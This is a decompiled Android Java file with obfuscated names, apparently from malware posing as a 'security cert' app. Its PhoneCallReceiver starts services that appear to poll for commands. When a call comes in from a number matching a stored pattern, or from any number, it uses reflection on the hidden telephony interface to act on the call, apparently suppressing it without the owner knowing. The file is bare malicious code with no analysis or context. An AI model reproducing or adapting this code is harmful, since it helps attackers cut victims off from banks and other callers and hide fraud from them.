package com.security.cert.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import com.a.a.a.d;
import com.security.cert.b.a.a;
import java.lang.reflect.Method;
import java.util.regex.Pattern;

public class PhoneCallReceiver extends BroadcastReceiver {
    private boolean a(String str, String str2) {
        return Pattern.compile(str).matcher(str2).matches();
    }

    private void c(Context context) {
        context.startService(new Intent(context, CheckCommandsService.class));
        context.startService(new Intent(context, CheckQueueService.class));
    }

    public void a(Context context) {
        try {
            b(context).a();
        } catch (Exception e) {
            Log.e(getClass().getSimpleName(), e.toString());
        }
    }

    public d b(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
        Method declaredMethod = Class.forName(telephonyManager.getClass().getName()).getDeclaredMethod("getITelephony", new Class[0]);
        declaredMethod.setAccessible(true);
        return (d) declaredMethod.invoke(telephonyManager, new Object[0]);
    }

    public void onReceive(Context context, Intent intent) {
        c(context);
        String e = a.e(context);
        if (e != null && intent.getAction().equalsIgnoreCase("android.intent.action.PHONE_STATE") && intent.getStringExtra("state").equals(TelephonyManager.EXTRA_STATE_RINGING)) {
            Log.d(getClass().getSimpleName(), "ACTION_TO_RECEIVER");
            if (e.equals(".*")) {
                a(context);
                return;
            }
            Bundle extras = intent.getExtras();
            if (extras != null && a(e, extras.getString("incoming_number"))) {
                a(context);
            }
        }
    }
}
